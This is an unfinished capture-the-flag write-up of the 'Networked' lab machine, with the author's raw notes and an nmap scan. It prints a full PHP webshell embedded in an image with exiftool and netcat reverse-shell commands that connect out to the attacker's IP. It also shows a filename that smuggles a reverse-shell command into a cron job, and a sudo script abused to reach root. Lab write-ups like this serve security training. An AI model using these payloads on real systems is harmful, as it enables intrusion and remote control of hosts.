Summary:

Networked was a relatively easy machine who's exploitation relied on input handling vulnerabilities in code. 
Exploitation starts with finding a an open port 80, which shows a simple page with some text. Checking the source shows comments about an upload and gallery page. Using Dirbuster, the pages are found (/upload.php, and photos.php). Navigating to /upload allows the attacker to submit an image to be added to gallery.php. By changing the extension to photo.php.png, webshell code can be injected. Then, by viewing the image, code is executed, and the attacker can spawn a reverse shell as a very low privilege user: Apache. 
To capture the user.txt flag, the attacker must escalate to another account named guly. This is done by observing a cron job which runs every 3 minutes as guly, which performs an rm -f command on files in the /uploads directory. By creating a file starting with ";", then followed by a reverse shell command, the program (which runs as guly) executes a connect to the attacker machine. This allows user.txt to be captured.
For privilege escalation, using sudo -l shows that guly can run a script, changename.sh, as root. This script takes input for a ifcfg file, and by entering "<BLANK SPACE>bash", opens a root shell. 


Attack Narrative: 

Beginning on Networked, <CODE>nmap -A 10.10.10.146<CODE> is used to scan for services, OS, etc. on the system. Results show only SSH (22) and HTTP (80) are open. 

<PIC of webpage> 

Navigating to http://10.10.10.146/ shows some text that is irrelevant.

<Pic of source>

However, checking the source of the page reveals that there are comments mentioning upload and gallery directories not yet being linked. 

<pic of dirbuster>

Using dirbuster reveals a page named upload.php, as well as another page named photos.php. These two pages were the ones references in the source of the home page.

<pic of upload.php>

The /upload.php page is a simple page which takes a file and uploads it to the system. However, trying to upload files of various types (.txt, .jpg, .ods, .png, .py, .php, .html) shows that the page only accepts image formats. This is expected since photos.php is related to the page. 

<pic of burp intercept>

To further test the upload functionality, Burpsuite is used to intercept the upload. A small picture of a dog (jpg format) is downloaded to act as a test file.

<pic of repeater> 

Then, the request is sent to the repeater, which allows for trial-and-error testing on the request. There are three "variables" which are tested on the image upload: the image name, MIME type, and magic bytes. <FILL THIS OUT MORE!!!>

<pic of exiftool being used> 

Given what is found through Burp testing, exiftool is used to insert PHP webshell code into the dog image. <CODE>exiftool -DocumentName="<h1 style="color:#942626\;">Chris's Shell #_</h1><h2>Command Result:<br />----------------------------------</h2><?php if(isset(\$_REQUEST['cmd'])){echo '<pre style="font-size:9pt\;color:#08ed00\;background-color:black\;">';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>" dog.jpg<CODE> is used to embed the malicious code into the picture, then the picture is renamed dog.php.jpg

<pic of successful upload>

Now, the dog.php.jpg image is uploaded to the site, and the file is placed on the system.

<pic of photos.php>

Navigating to the photos.php page, the dog picture is uploaded and clearly not interpreted correctly. Right-clicking on the picture and selecting "view image" opens it in a new tab.

<pic of shell with command>

Now, the shell is used by adding "?cmd= " to the end of the url, followed by any linux command. 

<pic of nc in url>

While this shell is usable, it is much more convenient to spawn a CLI shell rather than entering commands into a url. By using <CODE> nc -lvp 12345 <CODE> on the attacker machine, then using <CODE>nc -e bash <MY IP> 12345<CODE> causes a shell to spawn on the attacker machine. 

<pic of whoami + guly home dir>

Using <CODE>whoami<CODE> shows that the user is apache, which does not have read permissions on the user.txt file, which is located in /home/guly. This means that privilege escalation is required for user.txt. Looking at /home/guly shows two files of interest: check_attack.php, and crontab.guly. 

<pic of crontab.guly> 

Using <CODE>cat crontab.guly<CODE> shows that check_attack.php will execute as guly every 3 minutes. This immediately points to exploiting check_attack.php in some way. 

<pic of checkattack>

Using <CODE>cat check_attack.php<CODE> displays the content of the PHP. MORE ON THIS!!!!!!

<pic of touch>

So, the command <CODE>touch "; nc <MY IP> 54321 -c bash"<CODE> is used in the /var/www/html/uploads/ directory to create a file. This should stop <CODE>rm<CODE> from doing anything, then cause the system (which user is now guly) to netcat to the attacker. 

<pic of netcat connection + user.txt>

After 3 minutes, a connection is made between the systems and a shell is spawned as guly. The user.txt file is now read. 

<pic of sudo -l>

To begin escalation to root, <CODE>sudo -l<CODE> is used to check sudo permissions. Its output shows that guly can use MORE ON THIS!!!!!!

<pic of 

==============================================
]]]]]]]]]]]]]]] Networked [[[[[[[[[]][[[[[[[[[
==============================================
Start: 10-3-19
User: 10-8-19
Root: 10-10-19


IP: 10.10.10.146
OS: Linux

Begin with nmap -sC -A 10.10.10.146
==============================================
Open ports: 22, 80
==============================================

Used nmap automator

http page talks about 2 guys and facemesh. Says upload and gallery dirs not yet linked. 

Dirbuster finds /uploads/, which is just a period on a blank page.

SSH accepts publickey,gssapi-keyex,gssapi-with-mic,password for authentication

upload.php allows for an image file upload

backup allows for download of backup.tar file

By using exiftool, I can embed php commands into an image. 

Command: 
exiftool -DocumentName="<h1 style="color:#942626\;">Chris's Shell #_</h1><h2>Command Result:<br />----------------------------------</h2><?php if(isset(\$_REQUEST['cmd'])){echo '<pre style="font-size:9pt\;color:#08ed00\;background-color:black\;">';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?>" dog.jpg

Then, using burp to change the name of the file to dog.php.jpg, it interprets as php code when viewing it. 

Going to the page it is uploaded to, then appending ?cmd = XXXX allows for rce.

I am user Apache, but they have nologin on the /etc/passwd file, so that is why a nc fails.

Enum:

No sudo perms

guly has 2 files on his /home that are interesting: 

crontab.guly
*/3 * * * * php /home/guly/check_attack.php
	
	This means tht every 3 minutes the 		check_attack file is executed.


Writable dirs:
/dev/mqueue
/dev/shm
/proc/7335/task/7335/fd
/proc/7335/fd
/proc/7335/map_files
/var/tmp
/var/lib/php/session
/var/lib/dav
/var/cache/httpd
/var/cache/httpd/proxy
/var/www/html/uploads
/tmp


Turns out that the way of getting a shell as guly is to use command:

touch "deleteme.txt ; nc 10.10.12.118 11527 -c bash"

which will create the file of that name, then call as guly. 


Can sudo use changename.sh

#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0



Machine is rooted by entering "\ bash" when running the script



Full nmap results
============================================

Nmap scan report for 10.10.10.146
Host is up (0.18s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%), Linux 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   206.93 ms 10.10.12.1
2   207.73 ms 10.10.10.146

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.87 seconds
